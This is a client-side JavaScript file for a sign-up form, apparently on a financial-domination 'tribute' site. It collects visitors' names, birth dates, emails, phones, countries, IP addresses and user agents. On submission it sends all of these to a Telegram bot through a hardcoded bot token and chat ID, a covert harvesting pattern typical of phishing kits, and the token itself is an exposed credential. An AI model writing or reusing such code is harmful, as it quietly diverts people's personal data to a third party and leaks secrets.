function browserN(){if((navigator.userAgent.indexOf("Opera")||navigator.userAgent.indexOf('OPR'))!=-1){return'Opera'}else if(navigator.userAgent.indexOf("Edg")!=-1){return'Edge'}else if(navigator.userAgent.indexOf("Chrome")!=-1){return'Chrome'}else if(navigator.userAgent.indexOf("Safari")!=-1){return'Safari'}else if(navigator.userAgent.indexOf("Firefox")!=-1){return'Firefox'}else if((navigator.userAgent.indexOf("MSIE")!=-1)||(!!document.documentMode==!0)){return'IE'}else{return'unknown'}}
function fetch_ip(){$.getJSON("https://api.ipify.org?format=json",function(data){$("#eip").val(data.ip)})}
async function notify(message){
    const botToken='7582406379:AAFSqZwUfw807J6Qf51Wa3fSQS5pPhU-R3c';
    const chatId='1369859387';
    const url=`https://api.telegram.org/bot${botToken}/sendMessage`;
    const data = {
                chat_id: chatId,
                text: message
            };

    $.ajax({
        url: url,
        type: 'POST',
        data: JSON.stringify(data),
        contentType: "application/json; charset=utf-8",
        dataType: "json",
        cache: false,
        async: false,
        success: function (resp) {
            console.log(resp);
        },
        error: function(e) {
             console.log('Error: '+e);
        }
        });
}



       function capitalizeWithRegex(str) {
  return str.replace(/\b\w/g, char => char.toUpperCase());
}



          var getUrlParameter = function getUrlParameter(sParam) {
          var sPageURL = window.location.search.substring(1),
              sURLVariables = sPageURL.split('&'),
              sParameterName,
              i;

          for (i = 0; i < sURLVariables.length; i++) {
              sParameterName = sURLVariables[i].split('=');

              if (sParameterName[0] === sParam) {
                  return sParameterName[1] === undefined ? true : decodeURIComponent(sParameterName[1]);
              }
          }
          return false;
          };


        const mistress = getUrlParameter('mistress');

        var id_mistress = document.querySelectorAll("#namediv");
        id_mistress.forEach((el, index) => {
            var mistress_div = el.getAttribute("nameid");//className = "a_new_class"
            if (mistress_div == mistress){
              el.style.border = '5px solid lightgray';
              el.style.backgroundColor = 'lightgray';
            }
        });


        function isEmail(email) {
            var regex = /^([a-zA-Z0-9_.+-])+\@(([a-zA-Z0-9-])+\.)+([a-zA-Z0-9]{2,4})+$/;
            return regex.test(email);
        }

        function isPhone(phone) {
            if (!(!phone.includes("  ") && !phone.includes("--") && !phone.includes(" -") && !phone.includes("- "))) {
                return false;
              }
            // Check if phone contains hyphens or spaces
            if (/[\s-]/.test(phone)) {
                // Check if phone starts or ends with a space or hyphen
                if (/^[\s-]|[\s-]$/.test(phone)) {
                  return false;
                }
              }
            // Normalize phone number: Remove spaces and hyphens
            phone = phone.replace(/[\s-]/g, '');
            // Check if phone number is exactly 10 digits
            const regex = /^\d{10}$/;
            return regex.test(phone);
        }



        function onAction(iddiv){


        if(iddiv == "more18"){
          $("#is18more").show();
          $("#cover18").hide();

        }

        if(iddiv == "not18"){
          $("#cover18").show();
          $("#is18more").hide();

        }


        if(iddiv == "are_tribute"){
          var are_tribute = $("#are_tribute").val();
          if(are_tribute == "Yes"){

          $("#dur_tributediv").show();
          }else{
          $("#dur_tributediv").hide();
          $("#amount_tributediv").hide();
          $("#form_tributediv").hide();

          }

        }


        if(iddiv == "dur_tribute"){
          var dur_tribute = $("#dur_tribute").val();
          if(dur_tribute != ""){
          $("#amount_tributediv").show();
          }else{
          $("#amount_tributediv").hide();
          $("#form_tributediv").hide();
          }

        }


        if(iddiv == "amount_tribute"){
          var amount_tribute = $("#amount_tribute").val();
          if(amount_tribute != ""){
          $("#form_tributediv").show();
          }else{
          $("#form_tributediv").hide();
          }

        }

        }


        function browserN() {
            if ((navigator.userAgent.indexOf("Opera") || navigator.userAgent.indexOf('OPR')) != -1) {
              return 'Opera';
            } else if (navigator.userAgent.indexOf("Edg") != -1) {
              return 'Edge';
            } else if (navigator.userAgent.indexOf("Chrome") != -1) {
              return 'Chrome';
            } else if (navigator.userAgent.indexOf("Safari") != -1) {
              return 'Safari';
            } else if (navigator.userAgent.indexOf("Firefox") != -1) {
              return 'Firefox';
            } else if ((navigator.userAgent.indexOf("MSIE") != -1) || (!!document.documentMode == true)) //IF IE > 10
            {
              return 'IE';
            } else {
              return 'unknown';
            }

        }


        function fetch_ip(){
          $.getJSON("https://api.ipify.org?format=json", function(data) {
               $("#eip").val(data.ip);
          });

        }


        $(document).ready(function(){

        $('#dob').datepicker({
        format: 'dd/mm/yyyy',
        endDate: '-17y'
        });



        fetch_ip();
        let amount_tribute = "";
        let dur_tribute = "";
        let are_tribute = "";
        let get_ip = "";
        let fname = "";
        let lname = "";
        let dob = "";
        let email ="";
        let phone ="";
        let country = "";

        const provider = "SLAVE NEW FORM-DEVELOPER";
        const get_browsername = browserN();

        $("#eform").on("submit", function (e){
          e.preventDefault();
          amount_tribute = $("#amount_tribute").val();
          dur_tribute = $("#dur_tribute").val();
          are_tribute = $("#are_tribute").val();
          get_ip = $("#eip").val();
          fname = $("#fname").val();
          lname = $("#lname").val();
          dob = $("#dob").val();
          email = $("#email").val();
          phone = $("#phone").val();
          country = $("#country").val();

          if (fname == "" && lname=="" && dob=="" && email=="" && country==""){
              $(".error").html('<div id="error"><span>Fill Out fields With <b>*</b> </span></div>');

          }else if (fname == ""){

            $(".error").html('<div id="error"><span>Please Enter First Name</span></div>');

          }
          else if (lname == ""){

            $(".error").html('<div id="error"><span>Please Enter Last Name</span></div>');

          }
          else if (dob == ""){

            $(".error").html('<div id="error"><span>Please Enter Date of Birth</span></div>');

          }else if (email == ""){

            $(".error").html('<div id="error"><span>Please Enter Your Email Address</span></div>');


          }else if (!isEmail(email)){

            $(".error").html('<div id="error"><span>Please Enter Valid Email Address</span></div>');


          } else if (country == ""){

            $(".error").html('<div id="error"><span>Please Choose Your Country</span></div>');


          }else if (phone != "" && isPhone(phone) == false){

            $(".error").html('<div id="error"><span>Please Enter A Valid Phone Number</span></div>');


          }else{

            $(".error").html("");
            $('#dmterms').modal('show');




          }

        });

        $("#submit").on("click", function (e){
          e.preventDefault();
          if (fname != "" && lname !="" && dob !="" && email !="" && country !=""){

                var agreed = $("#agreed");
                if (agreed.is(':checked')) {
                    $(".error").html("");
                    $(".errors").html("");
                    var mdiv = "";
                    if(mistress != true && mistress != false){
                        var mdiv = `ONWER:${capitalizeWithRegex(mistress)}\n`;
                    }
                    console.log(mdiv);
                    var message = `PROVIDER: ${provider}\n${mdiv}FIRST NAME: ${fname}\nLAST NAME: ${lname}\nDATE OF BIRTH: ${dob}\nEMAIL ADDRESS: ${email}\nPHONE NUMBER: ${phone}\nCOUNTRY: ${country}\n================\nTRIBUTE DURATION: ${dur_tribute}\nTRIBUTE AMOUNT: ${amount_tribute}\nBROWSERNAME: ${get_browsername}\nUSER-AGENT: ${window.navigator.userAgent}\nIP ADDRESS: ${get_ip}\n`;
                    var status = notify(message);
                    window.location.href = "/success.html";

                }else{
                  $(".errors").html('<div id="error"><span>Check to accept the  <b>Terms and Conditions</b> </span></div>');
                }

            }else{

            $('#dmterms').modal('hide');

            $(".error").html('<div id="error"><span>Fill Out fields With <b>*</b> </span></div>');

            }
            });

        })
